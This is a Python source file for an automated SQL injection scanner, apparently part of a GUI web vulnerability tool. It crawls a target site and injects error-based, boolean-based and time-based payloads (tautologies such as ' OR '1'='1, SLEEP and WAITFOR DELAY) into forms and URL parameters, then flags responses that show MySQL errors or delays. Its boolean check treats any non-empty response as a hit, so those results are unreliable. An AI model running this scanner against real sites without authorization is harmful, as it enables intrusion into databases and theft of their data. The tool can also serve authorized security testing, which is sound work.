import requests
from vulnerability.crawl import Crawl
import tkinter as tk
import time

class SQL(Crawl):

    def __init__(self, target_url, ignore_links, output_text):
        super().__init__(target_url, ignore_links)
        self.output_text = output_text

        self.error_payloads = [
            "'", "\"", "' OR '1'='1 -- ", "' OR '1'='1#",
            "\") OR (\"1\"=\"1", "' OR 1=1--", "' OR '1'='1' /*"
        ]
        self.boolean_payloads = [
            "' AND 1=1 -- ", "' AND 1=0 -- ",
            "' OR 1=1 -- ", "' AND 'a'='a", "' AND 'a'='b"
        ]
        self.time_payloads = [
            "' OR SLEEP(5) -- ", "'; WAITFOR DELAY '0:0:5' --", "' AND SLEEP(5) -- "
        ]

        self.mysql_errors = [
            "SQL syntax", "mysql_fetch", "MySQL server", "Warning: mysql_",
            "check the manual that corresponds to", "Unknown column", "syntax to use",
            "Unclosed quotation mark", "quoted string not properly terminated"
        ]

    def run_program(self):
        for link in self.target_link:
            forms = self.extract_fourms(link)
            for form in forms:
                self.log(f"[+] Testing form in {link}")

                error_payload = self.test_sql_error_form(link, form)
                if error_payload:
                    self.log(f"[!!!] Error-based SQL Injection found in form on {link}")
                    self.log(f"Payload: {error_payload}\n")

                boolean_payload = self.test_boolean_sql_form(link, form)
                if boolean_payload:
                    self.log(f"[!!!] Boolean-based SQL Injection found in form on {link}")
                    self.log(f"Payload: {boolean_payload}\n")

                time_payload = self.test_time_sql_form(link, form)
                if time_payload:
                    self.log(f"[!!!] Time-based SQL Injection found in form on {link}")
                    self.log(f"Payload: {time_payload}\n")

            if "=" in link:
                self.log(f"[+] Testing URL-based SQLi in {link}")
                error_payload = self.test_sql_error_url(link)
                if error_payload:
                    self.log(f"[!!!] Error-based SQL Injection found in URL: {link}")
                    self.log(f"Payload: {error_payload}\n")

                boolean_payload = self.test_boolean_sql_url(link)
                if boolean_payload:
                    self.log(f"[!!!] Boolean-based SQL Injection found in URL: {link}")
                    self.log(f"Payload: {boolean_payload}\n")

                time_payload = self.test_time_sql_url(link)
                if time_payload:
                    self.log(f"[!!!] Time-based SQL Injection found in URL: {link}")
                    self.log(f"Payload: {time_payload}\n")

    def test_sql_error_form(self, url, form):
        for payload in self.error_payloads:
            try:
                response = self.submit_form(form, payload, url)
                content = response.content.decode(errors="ignore")
                if any(error in content for error in self.mysql_errors):
                    return payload
            except Exception as e:
                self.log(f"[!] Error testing form (error-based): {e}")
        return None

    def test_sql_error_url(self, url):
        for payload in self.error_payloads:
            if "=" not in url:
                continue
            test_url = url.replace("=", f"={payload}", 1)
            try:
                response = self.session.get(test_url)
                content = response.content.decode(errors="ignore")
                if any(error in content for error in self.mysql_errors):
                    return payload
            except requests.exceptions.RequestException as e:
                self.log(f"[!] Request failed: {e}")
        return None

    def test_boolean_sql_form(self, url, form):
        for payload in self.boolean_payloads:
            try:
                response = self.submit_form(form, payload, url)
                if len(response.content) > 0:
                    return payload
            except Exception as e:
                self.log(f"[!] Error testing form (boolean-based): {e}")
        return None

    def test_boolean_sql_url(self, url):
        for payload in self.boolean_payloads:
            if "=" not in url:
                continue
            test_url = url.replace("=", f"={payload}", 1)
            try:
                response = self.session.get(test_url)
                if len(response.content) > 0:
                    return payload
            except Exception as e:
                self.log(f"[!] Error testing URL (boolean-based): {e}")
        return None

    def test_time_sql_form(self, url, form):
        for payload in self.time_payloads:
            try:
                start = time.time()
                self.submit_form(form, payload, url)
                elapsed = time.time() - start
                if elapsed > 4:
                    return payload
            except Exception as e:
                self.log(f"[!] Error testing form (time-based): {e}")
        return None

    def test_time_sql_url(self, url):
        for payload in self.time_payloads:
            if "=" not in url:
                continue
            test_url = url.replace("=", f"={payload}", 1)
            try:
                start = time.time()
                self.session.get(test_url)
                elapsed = time.time() - start
                if elapsed > 4:
                    return payload
            except Exception as e:
                self.log(f"[!] Error testing URL (time-based): {e}")
        return None

    def log(self, message):
        self.output_text.insert(tk.END, message + "\n")
        self.output_text.see(tk.END)